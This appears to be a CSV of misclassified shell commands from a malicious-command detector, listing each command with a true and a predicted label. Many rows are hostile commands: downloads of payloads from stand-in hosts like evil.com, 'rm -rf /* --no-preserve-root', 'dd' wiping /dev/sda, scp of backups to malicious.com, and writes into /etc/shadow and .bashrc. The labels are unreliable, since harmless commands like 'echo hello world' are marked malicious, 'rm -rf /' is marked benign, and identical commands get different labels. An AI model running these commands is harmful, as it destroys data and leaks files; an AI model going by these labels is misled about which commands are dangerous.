command,true_label,predicted_label
sudo apt   update,MALICIOUS,BENIGN
wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
rm -rf /home/user,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
ls   /root/,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
curl https://fileshare.com/exploit.zip,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
curl   https://evil.com/update.bin,MALICIOUS,BENIGN
WHICH   PYTHON,MALICIOUS,BENIGN
wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
LS /ROOT/,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,SUSPICIOUS
history,BENIGN,SUSPICIOUS
cd   /tmp/,BENIGN,MALICIOUS
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
cat   homework.txt,MALICIOUS,BENIGN
 scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
ifconfig,BENIGN,MALICIOUS
 curl https://fileshare.com/update.bin,SUSPICIOUS,MALICIOUS
curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
cat   /var/log/syslog,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
SUDO   SU,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
netstat -tulnp,BENIGN,MALICIOUS
cat /home/user/info.txt,BENIGN,SUSPICIOUS
grep root /etc/passwd ,SUSPICIOUS,BENIGN
curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
cat /etc/shadow,BENIGN,SUSPICIOUS
ls -al,MALICIOUS,BENIGN
echo 'pwned' >   /var/log/syslog,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
curl https://fileshare.com/exploit.zip,SUSPICIOUS,MALICIOUS
 CAT /HOME/USER/TODO.TXT,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
wget http://fileshare.com/payload.sh ,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
touch homework.doc,BENIGN,MALICIOUS
scp data.tar.gz root@malicious.com:/tmp/ ,SUSPICIOUS,BENIGN
curl   https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
find   / -name 'test',SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
watch netstat   -an,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
 ls /root/,SUSPICIOUS,BENIGN
CURL -O HTTP://EVIL.COM/UPDATE.BIN ,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
rm -rf   /var/,SUSPICIOUS,BENIGN
DU -SH ,BENIGN,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
sudo   apt install net-tools,BENIGN,MALICIOUS
 curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
echo 'hacked' > /etc/shadow,SUSPICIOUS,BENIGN
watch   netstat -an,MALICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
CAT   HOMEWORK.TXT,SUSPICIOUS,BENIGN
cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
cat   .bashrc,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
 cat /etc/shadow,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,SUSPICIOUS
whoami ,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
cat notes.txt,BENIGN,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/root/,MALICIOUS,BENIGN
TOUCH HOMEWORK.DOC,BENIGN,MALICIOUS
wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
netstat -tulnp,BENIGN,SUSPICIOUS
echo 'hello world',MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
scp backup.sql root@backup.server:/tmp/,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS,BENIGN
echo 'owned' > /root/.bashrc,MALICIOUS,BENIGN
SUDO APT INSTALL NET-TOOLS,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
wget http://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,SUSPICIOUS
rm   -rf /home/user,SUSPICIOUS,BENIGN
du -sh,BENIGN,SUSPICIOUS
pwd,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
cat   /var/log/auth.log,SUSPICIOUS,BENIGN
scp file.txt user@backup.server:/var/www,MALICIOUS,BENIGN
cat /root/.bashrc ,SUSPICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
ps aux | grep   mysql,SUSPICIOUS,MALICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
 uname -a,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc ,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
PS AUX,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
ls /tmp/ ,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
sudo   su,BENIGN,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,BENIGN
CAT   /HOME/USER/INFO.TXT,SUSPICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh ,BENIGN,SUSPICIOUS
df -h,MALICIOUS,BENIGN
iptables -f,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
 ping google.com,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
 echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
cd   /var/www,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
env ,SUSPICIOUS,BENIGN
cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
ECHO 'HACKED' >   /ROOT/.BASHRC,SUSPICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
 scp file.txt user@malicious.com:/tmp/,MALICIOUS,SUSPICIOUS
ls -al ,SUSPICIOUS,BENIGN
ps aux |   grep nginx,MALICIOUS,BENIGN
cat   readme.md,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,BENIGN,MALICIOUS
sudo -l,BENIGN,SUSPICIOUS
wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
cat   /home/user/todo.txt,MALICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
 cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
scp data.tar.gz user@192.168.0.2:/tmp/,MALICIOUS,SUSPICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
find / -name 'test',BENIGN,SUSPICIOUS
ls   -al,BENIGN,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh,SUSPICIOUS,BENIGN
 CAT ~/.SSH/KNOWN_HOSTS,BENIGN,MALICIOUS
ls /root/,SUSPICIOUS,BENIGN
curl https://fileshare.com/update.bin,SUSPICIOUS,BENIGN
cd /root/ ,MALICIOUS,SUSPICIOUS
du -sh,SUSPICIOUS,BENIGN
 du -sh,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
cd   /root,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
 SUDO -L,MALICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS,BENIGN
curl https://suspicious.org/update.bin,MALICIOUS,SUSPICIOUS
 ls -al,SUSPICIOUS,BENIGN
rm -rf /,BENIGN,SUSPICIOUS
ls   /var/www,BENIGN,MALICIOUS
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
 du -sh,MALICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
IPTABLES -F,SUSPICIOUS,BENIGN
 RM -RF /* --NO-PRESERVE-ROOT,BENIGN,MALICIOUS
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
 ls -al,MALICIOUS,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
echo   'hello world',SUSPICIOUS,BENIGN
CAT   NOTES.TXT,BENIGN,MALICIOUS
ps aux,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
 pwd,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
cat /var/log/auth.log ,MALICIOUS,BENIGN
 curl https://fileshare.com/update.bin,SUSPICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
scp backup.sql root@malicious.com:/tmp/,BENIGN,MALICIOUS
pwd,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cat   welcome.txt,BENIGN,MALICIOUS
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,SUSPICIOUS
mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
cd /tmp/,MALICIOUS,BENIGN
IPTABLES -F,BENIGN,MALICIOUS
ping google.com,MALICIOUS,SUSPICIOUS
rm -rf /home/user,SUSPICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
CAT ~/.SSH/KNOWN_HOSTS,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
CAT /ETC/PASSWD,MALICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
ECHO   'OWNED' > /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
cat   readme.md,SUSPICIOUS,BENIGN
 sudo su,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
ECHO 'HACKED' > /ETC/SHADOW,SUSPICIOUS,MALICIOUS
cat   /var/log/auth.log,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
pwd,BENIGN,SUSPICIOUS
wget http://evil.com/payload.sh,MALICIOUS,BENIGN
wget http://evil.com/update.bin,MALICIOUS,BENIGN
echo   'hello world',SUSPICIOUS,MALICIOUS
cat homework.txt,BENIGN,MALICIOUS
cd /var/www,BENIGN,SUSPICIOUS
sudo su,MALICIOUS,BENIGN
cat /var/log/syslog ,MALICIOUS,BENIGN
cat readme.md,BENIGN,SUSPICIOUS
uname -a,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
scp   data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
sudo apt update,SUSPICIOUS,MALICIOUS
ls /root/,SUSPICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
curl https://fileshare.com/update.bin,BENIGN,SUSPICIOUS
cat notes.txt,MALICIOUS,BENIGN
cat   readme.md,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,MALICIOUS
ps aux,BENIGN,SUSPICIOUS
cat .bashrc,SUSPICIOUS,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,SUSPICIOUS
cat /home/user/info.txt ,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,MALICIOUS
cat   welcome.txt,SUSPICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,MALICIOUS,SUSPICIOUS
cat /var/log/auth.log,SUSPICIOUS,BENIGN
WGET HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
ifconfig,BENIGN,MALICIOUS
echo 'hello world',SUSPICIOUS,MALICIOUS
ps aux | grep mysql,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts ,BENIGN,SUSPICIOUS
netstat -tulnp,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
 cat /root/.bashrc,BENIGN,MALICIOUS
sudo su,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,BENIGN,SUSPICIOUS
grep 'password' /etc/passwd,MALICIOUS,BENIGN
sudo apt install nmap,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
WHOAMI,SUSPICIOUS,MALICIOUS
netstat   -tulnp,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
scp file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
GREP ROOT /ETC/PASSWD,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
PING GOOGLE.COM,SUSPICIOUS,BENIGN
 rm -rf /var/,MALICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
sudo   su,SUSPICIOUS,BENIGN
 ls /var/www,MALICIOUS,SUSPICIOUS
ls   /root/,MALICIOUS,SUSPICIOUS
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP ,MALICIOUS,BENIGN
WHOAMI,SUSPICIOUS,BENIGN
cd /var/www,MALICIOUS,SUSPICIOUS
pwd,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
pwd ,MALICIOUS,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,MALICIOUS
wget   http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
cat /var/log/syslog,BENIGN,MALICIOUS
ps aux | grep mysql,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,BENIGN,SUSPICIOUS
cd /root,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
watch netstat -an ,BENIGN,MALICIOUS
WGET   HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS,BENIGN
watch   netstat -an,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,MALICIOUS
scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
cat   /var/log/syslog,BENIGN,SUSPICIOUS
cat   homework.txt,BENIGN,MALICIOUS
scp backup.sql root@malicious.com:/root/,BENIGN,MALICIOUS
cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
ls /root/,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
CD /VAR/WWW,MALICIOUS,SUSPICIOUS
ps aux   | grep sshd,MALICIOUS,BENIGN
 cd /var/www,SUSPICIOUS,MALICIOUS
cat /etc/passwd,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
pwd,BENIGN,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
CAT   /VAR/LOG/AUTH.LOG,BENIGN,MALICIOUS
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
CAT /ETC/PASSWD ,MALICIOUS,BENIGN
curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
 du -sh,MALICIOUS,SUSPICIOUS
rm   -rf /,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl   https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
whoami,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
df -h,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat   /var/log/syslog,SUSPICIOUS,BENIGN
CAT /VAR/LOG/AUTH.LOG,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
cat   .bashrc,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,SUSPICIOUS
echo 'owned' >> /var/log/syslog,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
find / -name 'test',BENIGN,SUSPICIOUS
history,SUSPICIOUS,BENIGN
CAT WELCOME.TXT ,MALICIOUS,BENIGN
cat   /var/log/auth.log,SUSPICIOUS,BENIGN
CD /ROOT/,MALICIOUS,BENIGN
which   python,MALICIOUS,SUSPICIOUS
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
echo 'owned'   > /var/log/syslog,SUSPICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
 cat /home/user/info.txt,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
WGET   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
CD /ROOT/,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
echo 'pwned' >>   /var/log/syslog,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
pwd,MALICIOUS,SUSPICIOUS
du -sh,MALICIOUS,BENIGN
iptables   -F,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,MALICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,MALICIOUS
GREP 'PASSWORD'   /ETC/PASSWD,MALICIOUS,BENIGN
touch homework.doc ,SUSPICIOUS,MALICIOUS
rm -rf /home/user,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
 rm -rf /,SUSPICIOUS,BENIGN
 grep root /etc/passwd,MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
 cat .bashrc,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
rm   -rf /home/user,SUSPICIOUS,BENIGN
scp data.tar.gz root@backup.server:/root/,MALICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,BENIGN
echo 'hello world' ,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
 du -sh,SUSPICIOUS,BENIGN
UNAME -A,BENIGN,SUSPICIOUS
cd /tmp/,MALICIOUS,SUSPICIOUS
sudo apt install nmap,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
 cat .bashrc,SUSPICIOUS,MALICIOUS
ps aux,SUSPICIOUS,BENIGN
CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
iptables -F,MALICIOUS,SUSPICIOUS
cd /root,SUSPICIOUS,BENIGN
curl   https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
echo   'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
du -sh,BENIGN,SUSPICIOUS
echo 'hello world',SUSPICIOUS,MALICIOUS
sudo -l,MALICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,MALICIOUS,SUSPICIOUS
env,MALICIOUS,SUSPICIOUS
wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
 cat .bashrc,MALICIOUS,BENIGN
touch homework.doc,BENIGN,MALICIOUS
grep 'password'   /etc/passwd,SUSPICIOUS,BENIGN
mkdir   test,MALICIOUS,SUSPICIOUS
cat homework.txt,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
history,BENIGN,MALICIOUS
 uname -a,MALICIOUS,BENIGN
mv /bin/bash   /tmp/bash,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
cat welcome.txt,BENIGN,MALICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,BENIGN,MALICIOUS
echo 'hacked' >> /etc/shadow,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
ps aux,BENIGN,SUSPICIOUS
echo   'hello',MALICIOUS,SUSPICIOUS
 chmod 777 /etc/shadow,BENIGN,MALICIOUS
cat welcome.txt,SUSPICIOUS,MALICIOUS
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
 wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
watch netstat -an,BENIGN,SUSPICIOUS
cat welcome.txt,MALICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
rm   -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
sudo apt   install net-tools,MALICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,MALICIOUS
cat   /etc/shadow,SUSPICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh,MALICIOUS,BENIGN
cat   /root/.bashrc,MALICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
scp data.tar.gz user@malicious.com:/var/www,MALICIOUS,BENIGN
rm -rf /home/user,MALICIOUS,BENIGN
echo 'owned' > /etc/shadow,MALICIOUS,SUSPICIOUS
CAT ~/.SSH/KNOWN_HOSTS,MALICIOUS,SUSPICIOUS
ls /root/,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,MALICIOUS
watch netstat -an,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
ping   google.com,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
ping   google.com,SUSPICIOUS,BENIGN
 cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,BENIGN,MALICIOUS
top -n 1,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
